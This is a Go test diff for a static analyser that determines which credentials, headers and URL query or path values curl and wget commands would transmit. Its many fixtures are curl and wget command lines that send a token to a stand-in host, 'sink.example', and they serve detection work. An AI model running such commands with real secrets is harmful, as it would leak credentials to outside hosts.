@@ -94,6 +94,15 @@ func TestStaticCurlTransmittedMetadata(t *testing.T) {
 	t.Parallel()
 
 	const token = "test-transmitted-metadata"
+	httpsComponents := func(values ...string) []TransmittedRequestComponent {
+		components := make([]TransmittedRequestComponent, 0, len(values))
+		for _, value := range values {
+			components = append(components, TransmittedRequestComponent{
+				Value: value, Scheme: "https", Host: "sink.example",
+			})
+		}
+		return components
+	}
 	for _, test := range []struct {
 		name                      string
 		argv                      []string
@@ -103,7 +112,164 @@ func TestStaticCurlTransmittedMetadata(t *testing.T) {
 		wantHTTPOriginCredentials []string
 		wantFTPOriginCredentials  []string
 		wantHTTPBearerTokens      []string
+		wantHTTPRequestComponents []TransmittedRequestComponent
+		checkRequestComponents    bool
 	}{
+		{
+			name: "literal HTTP URL path", argv: []string{
+				"curl", "https://sink.example/secrets/" + token,
+			},
+			wantHTTPRequestComponents: httpsComponents("/secrets/" + token),
+			checkRequestComponents:    true,
+		},
+		{
+			name: "dot segment URL path excluded", argv: []string{
+				"curl", "https://sink.example/safe/../" + token,
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "percent URL path excluded", argv: []string{
+				"curl", "https://sink.example/secrets/%41" + token,
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "backslash URL path excluded", argv: []string{
+				"curl", `https://sink.example/secrets/\` + token,
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "literal HTTP URL query", argv: []string{
+				"curl", "https://sink.example/search?credential=" + token,
+			},
+			wantHTTPRequestComponents: httpsComponents(
+				"/search", "credential="+token,
+			),
+			checkRequestComponents: true,
+		},
+		{
+			name: "joined URL option query", argv: []string{
+				"curl", "--url=https://sink.example/search?credential=" + token,
+			},
+			wantHTTPRequestComponents: httpsComponents(
+				"/search", "credential="+token,
+			),
+			checkRequestComponents: true,
+		},
+		{
+			name: "URL fragment excluded", argv: []string{
+				"curl", "https://sink.example/search#" + token,
+			},
+			wantHTTPRequestComponents: httpsComponents("/search"),
+			checkRequestComponents:    true,
+		},
+		{
+			name: "invalid space after URL query excludes candidate", argv: []string{
+				"curl", "https://sink.example/search?credential=" + token + " space",
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "invalid fragment space excludes prior query candidate", argv: []string{
+				"curl", "https://sink.example/search?credential=" + token + "#bad fragment",
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "request target overrides URL query", argv: []string{
+				"curl", "--request-target", "/safe",
+				"https://sink.example/search?credential=" + token,
+			},
+			wantHTTPRequestComponents: httpsComponents("/safe"),
+			checkRequestComponents:    true,
+		},
+		{
+			name: "request target query replaces URL query", argv: []string{
+				"curl", "--request-target", "/safe?credential=" + token,
+				"https://sink.example/search?credential=fixture",
+			},
+			wantHTTPRequestComponents: httpsComponents("/safe?credential=" + token),
+			checkRequestComponents:    true,
+		},
+		{
+			name: "absolute request target is transmitted verbatim", argv: []string{
+				"curl", "--request-target",
+				"https://other.example/secrets/" + token,
+				"https://sink.example/search",
+			},
+			wantHTTPRequestComponents: httpsComponents(
+				"https://other.example/secrets/" + token,
+			),
+			checkRequestComponents: true,
+		},
+		{
+			name: "final request target wins", argv: []string{
+				"curl", "--request-target", "/safe?credential=" + token,
+				"--request-target", "/safe?credential=fixture",
+				"https://sink.example/search",
+			},
+			wantHTTPRequestComponents: httpsComponents("/safe?credential=fixture"),
+			checkRequestComponents:    true,
+		},
+		{
+			name: "final request target is sensitive", argv: []string{
+				"curl", "--request-target", "/safe?credential=fixture",
+				"--request-target", "/safe?credential=" + token,
+				"https://sink.example/search",
+			},
+			wantHTTPRequestComponents: httpsComponents("/safe?credential=" + token),
+			checkRequestComponents:    true,
+		},
+		{
+			name: "invalid request target excludes all metadata", argv: []string{
+				"curl", "--header", "Authorization: " + token,
+				"--request-target", "/bad target",
+				"https://sink.example/search",
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "FTP query excluded", argv: []string{
+				"curl", "ftp://sink.example/search?credential=" + token,
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "scheme-relative target excluded", argv: []string{
+				"curl", "--header", "Authorization: " + token,
+				"//sink.example/search?credential=" + token,
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "schemeless target excluded", argv: []string{
+				"curl", "--header", "Authorization: " + token,
+				"sink.example/search?credential=" + token,
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "expanding URL query excluded", argv: []string{
+				"curl", "https://sink.example/search?credential=" + token,
+			},
+			expandIndex:            1,
+			checkRequestComponents: true,
+		},
+		{
+			name: "URL glob query excluded", argv: []string{
+				"curl", "https://sink.example/{one,two}?credential=" + token,
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "peer override excludes URL query", argv: []string{
+				"curl", "--unix-socket", "/tmp/service.sock",
+				"https://sink.example/search?credential=" + token,
+			},
+			checkRequestComponents: true,
+		},
 		{
 			name: "separate custom header", argv: []string{
 				"curl", "--header", "Authorization: " + token,
@@ -395,14 +561,313 @@ func TestStaticCurlTransmittedMetadata(t *testing.T) {
 				) || !slices.Equal(
 				got.FTPOriginCredentials,
 				test.wantFTPOriginCredentials,
-			) || !slices.Equal(got.HTTPBearerTokens, test.wantHTTPBearerTokens) {
+			) || !slices.Equal(got.HTTPBearerTokens, test.wantHTTPBearerTokens) ||
+				test.checkRequestComponents && !slices.Equal(
+					got.HTTPRequestComponents,
+					test.wantHTTPRequestComponents,
+				) {
 				t.Fatalf(
-					"metadata = %#v, want headers %q, HTTP credentials %q, FTP credentials %q, and HTTP bearer tokens %q",
+					"metadata = %#v, want headers %q, HTTP credentials %q, FTP credentials %q, HTTP bearer tokens %q, and HTTP request components %#v",
 					got,
 					test.wantHeaders,
 					test.wantHTTPOriginCredentials,
 					test.wantFTPOriginCredentials,
 					test.wantHTTPBearerTokens,
+					test.wantHTTPRequestComponents,
+				)
+			}
+		})
+	}
+}
+
+func TestStaticWgetTransmittedMetadata(t *testing.T) {
+	t.Parallel()
+
+	const token = "test-transmitted-metadata"
+	for _, test := range []struct {
+		name                      string
+		argv                      []string
+		expandIndex               int
+		mixedIndex                int
+		nulIndex                  int
+		wantHTTPHeaders           []string
+		wantHTTPOriginCredentials []string
+		wantFTPOriginCredentials  []string
+		wantHTTPRequestComponents []TransmittedRequestComponent
+	}{
+		{
+			name: "literal HTTP URL query", argv: []string{
+				"wget", "https://sink.example/search?credential=" + token,
+			},
+			wantHTTPRequestComponents: []TransmittedRequestComponent{
+				{
+					Value:  "credential=" + token,
+					Scheme: "https",
+					Host:   "sink.example",
+				},
+			},
+		},
+		{
+			name: "URL fragment excluded", argv: []string{
+				"wget", "https://sink.example/search#" + token,
+			},
+		},
+		{
+			name: "FTP URL query excluded", argv: []string{
+				"wget", "ftp://sink.example/search?credential=" + token,
+			},
+		},
+		{
+			name: "expanding URL query excluded", argv: []string{
+				"wget", "https://sink.example/search?credential=" + token,
+			},
+			expandIndex: 1,
+		},
+		{
+			name: "non-ASCII URL query excluded", argv: []string{
+				"wget", "https://sink.example/search?credential=" + token + "é",
+			},
+		},
+		{
+			name: "encoded Wget URL query punctuation excluded", argv: []string{
+				"wget", `https://sink.example/search?credential=BACK\` + token,
+			},
+		},
+		{
+			name: "literal custom header", argv: []string{
+				"wget", "--header", "Authorization: " + token,
+				"https://sink.example/download",
+			},
+			wantHTTPHeaders: []string{"Authorization: " + token},
+		},
+		{
+			name: "proxy authorization is not origin metadata", argv: []string{
+				"wget", "--header", "Proxy-Authorization: " + token,
+				"https://sink.example/download",
+			},
+		},
+		{
+			name: "NUL header excluded", argv: []string{
+				"wget", "--header", "X-Fixture: value",
+				"https://sink.example/download",
+			},
+			nulIndex: 2,
+		},
+		{
+			name: "scheme-relative target excludes metadata", argv: []string{
+				"wget", "--header", "Authorization: " + token,
+				"//sink.example/download",
+			},
+		},
+		{
+			name: "schemeless target excludes metadata", argv: []string{
+				"wget", "--header", "Authorization: " + token,
+				"sink.example/download",
+			},
+		},
+		{
+			name: "final header name wins case insensitively", argv: []string{
+				"wget", "--header", "X-Token: " + token,
+				"--header", "x-token: fixture", "https://sink.example/download",
+			},
+			wantHTTPHeaders: []string{"x-token: fixture"},
+		},
+		{
+			name: "distinct header names remain effective", argv: []string{
+				"wget", "--header", "X-Token: " + token,
+				"--header", "X-Fixture: value", "https://sink.example/download",
+			},
+			wantHTTPHeaders: []string{"X-Token: " + token, "X-Fixture: value"},
+		},
+		{
+			name: "empty header clears prior values", argv: []string{
+				"wget", "--header", "X-Token: " + token,
+				"--header=", "https://sink.example/download",
+			},
+		},
+		{
+			name: "header after empty reset is effective", argv: []string{
+				"wget", "--header", "X-Fixture: value", "--header=",
+				"--header", "X-Token: " + token,
+				"https://sink.example/download",
+			},
+			wantHTTPHeaders: []string{"X-Token: " + token},
+		},
+		{
+			name: "expanding header excluded", argv: []string{
+				"wget", "--header", "Authorization: " + token,
+				"https://sink.example/download",
+			},
+			expandIndex: 2,
+		},
+		{
+			name: "mixed header excluded", argv: []string{
+				"wget", "--header", "Authorization: " + token,
+				"https://sink.example/download",
+			},
+			mixedIndex: 2,
+		},
+		{
+			name: "explicit config excludes metadata", argv: []string{
+				"wget", "--config=wgetrc", "--header", "X-Token: " + token,
+				"https://sink.example/download",
+			},
+		},
+		{
+			name: "input file excludes metadata", argv: []string{
+				"wget", "--input-file=urls.txt", "--header", "X-Token: " + token,
+				"https://sink.example/download",
+			},
+		},
+		{
+			name: "HTTP and FTP generic credentials", argv: []string{
+				"wget", "--no-config", "--user", "agent", "--password", token,
+				"https://sink.example/download",
+			},
+			wantHTTPOriginCredentials: []string{"agent", token},
+			wantFTPOriginCredentials:  []string{"agent", token},
+		},
+		{
+			name: "spider transmits generic credentials", argv: []string{
+				"wget", "--spider", "--no-config", "--user", "agent",
+				"--password", token, "https://sink.example/download",
+			},
+			wantHTTPOriginCredentials: []string{"agent", token},
+			wantFTPOriginCredentials:  []string{"agent", token},
+		},
+		{
+			name: "ambient config prevents generic auth proof", argv: []string{
+				"wget", "--user", "agent", "--password", token,
+				"https://sink.example/download",
+			},
+		},
+		{
+			name: "lone user is FTP metadata only", argv: []string{
+				"wget", "--no-config", "--user", token,
+				"ftp://sink.example/download",
+			},
+			wantFTPOriginCredentials: []string{token},
+		},
+		{
+			name: "lone password is not closed FTP metadata", argv: []string{
+				"wget", "--no-config", "--password", token,
+				"ftp://sink.example/download",
+			},
+		},
+		{
+			name: "empty user preserves password presence", argv: []string{
+				"wget", "--no-config", "--user=", "--password", token,
+				"https://sink.example/download",
+			},
+			wantHTTPOriginCredentials: []string{token},
+			wantFTPOriginCredentials:  []string{token},
+		},
+		{
+			name: "empty password preserves user presence", argv: []string{
+				"wget", "--no-config", "--user", token, "--password=",
+				"https://sink.example/download",
+			},
+			wantHTTPOriginCredentials: []string{token},
+			wantFTPOriginCredentials:  []string{token},
+		},
+		{
+			name: "final password wins", argv: []string{
+				"wget", "--no-config", "--user", "agent", "--password", token,
+				"--password", "fixture", "https://sink.example/download",
+			},
+			wantHTTPOriginCredentials: []string{"agent", "fixture"},
+			wantFTPOriginCredentials:  []string{"agent", "fixture"},
+		},
+		{
+			name: "final empty password drops earlier value", argv: []string{
+				"wget", "--no-config", "--user", "agent", "--password", token,
+				"--password=", "https://sink.example/download",
+			},
+			wantHTTPOriginCredentials: []string{"agent"},
+			wantFTPOriginCredentials:  []string{"agent"},
+		},
+		{
+			name: "authorization header suppresses HTTP generated auth", argv: []string{
+				"wget", "--no-config", "--user", "agent", "--password", token,
+				"--header", "Authorization: fixture",
+				"https://sink.example/download",
+			},
+			wantHTTPHeaders:          []string{"Authorization: fixture"},
+			wantFTPOriginCredentials: []string{"agent", token},
+		},
+		{
+			name: "empty authorization value suppresses HTTP generated auth", argv: []string{
+				"wget", "--no-config", "--user", "agent", "--password", token,
+				"--header", "Authorization:", "https://sink.example/download",
+			},
+			wantHTTPHeaders:          []string{"Authorization: "},
+			wantFTPOriginCredentials: []string{"agent", token},
+		},
+		{
+			name: "header reset restores HTTP generated auth", argv: []string{
+				"wget", "--no-config", "--user", "agent", "--password", token,
+				"--header", "Authorization: fixture", "--header=",
+				"https://sink.example/download",
+			},
+			wantHTTPOriginCredentials: []string{"agent", token},
+			wantFTPOriginCredentials:  []string{"agent", token},
+		},
+		{
+			name: "URL userinfo overrides generic credentials", argv: []string{
+				"wget", "--no-config", "--user", "agent", "--password", token,
+				"https://fixture:fixture@sink.example/download",
+			},
+		},
+		{
+			name: "multiple targets make generic auth target binding uncertain", argv: []string{
+				"wget", "--no-config", "--user", "agent", "--password", token,
+				"https://one.example/download", "https://two.example/download",
+			},
+		},
+		{
+			name: "proxy credentials excluded", argv: []string{
+				"wget", "--no-config", "--proxy-user", "proxy",
+				"--proxy-password", token, "https://sink.example/download",
+			},
+		},
+	} {
+		test := test
+		t.Run(test.name, func(t *testing.T) {
+			t.Parallel()
+			facts := Analyze(Input{Tool: "exec", Argv: test.argv})
+			if len(facts.Commands) != 1 {
+				t.Fatalf("commands = %#v", facts.Commands)
+			}
+			if test.expandIndex > 0 {
+				facts.Commands[0].Arguments[test.expandIndex].Expands = true
+			}
+			if test.mixedIndex > 0 {
+				facts.Commands[0].Arguments[test.mixedIndex].Quote = QuoteMixed
+			}
+			if test.nulIndex > 0 {
+				facts.Commands[0].Argv[test.nulIndex] += "\x00" + token
+				facts.Commands[0].Arguments[test.nulIndex].Value =
+					facts.Commands[0].Argv[test.nulIndex]
+			}
+			got := StaticWgetTransmittedMetadata(facts.Commands[0])
+			if !slices.Equal(got.HTTPHeaders, test.wantHTTPHeaders) ||
+				!slices.Equal(
+					got.HTTPOriginCredentials,
+					test.wantHTTPOriginCredentials,
+				) || !slices.Equal(
+				got.FTPOriginCredentials,
+				test.wantFTPOriginCredentials,
+			) || !slices.Equal(
+				got.HTTPRequestComponents,
+				test.wantHTTPRequestComponents,
+			) {
+				t.Fatalf(
+					"metadata = %#v, want HTTP headers %q, HTTP credentials %q, FTP credentials %q, and HTTP URL queries %#v",
+					got,
+					test.wantHTTPHeaders,
+					test.wantHTTPOriginCredentials,
+					test.wantFTPOriginCredentials,
+					test.wantHTTPRequestComponents,
 				)
 			}
 		})
